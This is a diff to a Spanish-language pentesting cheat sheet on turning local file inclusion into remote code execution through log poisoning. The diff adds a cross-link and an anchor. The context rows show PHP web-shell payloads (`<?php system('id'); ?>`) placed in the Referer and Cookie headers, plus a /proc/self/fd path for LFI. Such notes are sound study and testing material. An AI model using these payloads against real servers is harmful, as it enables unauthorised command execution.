@@ -7,6 +7,7 @@ secondary categories:
 tertiary categories:
 type: CheatSheet
 linked:
+  - "[[File Inclusion]]"
 ---
 # LFI To RCE - Log Poisoning 
 
@@ -26,7 +27,7 @@ linked:
 | <br>Proc self fd                       | <br>Acceder a file descriptors del proceso en vez de rutas de log estáticas | <br>LFI: `/proc/self/fd/2` (stderr)<br><br>                                           |
 | <br>Envenenamiento vía Referer<br><br> | <br>Inyectar código PHP en el header Referer                                | <br>Referer: `<?php system('id'); ?>` → incluir access log<br><br>                    |
 | <br>Envenenamiento vía Cookie<br><br>  | <br>Inyectar código PHP en una cookie personalizada                         | <br>Cookie: `<?php system('id'); ?>` → incluir access log<br><br>                     |
-
+^lfi-logpoisoning
 
 ***
 
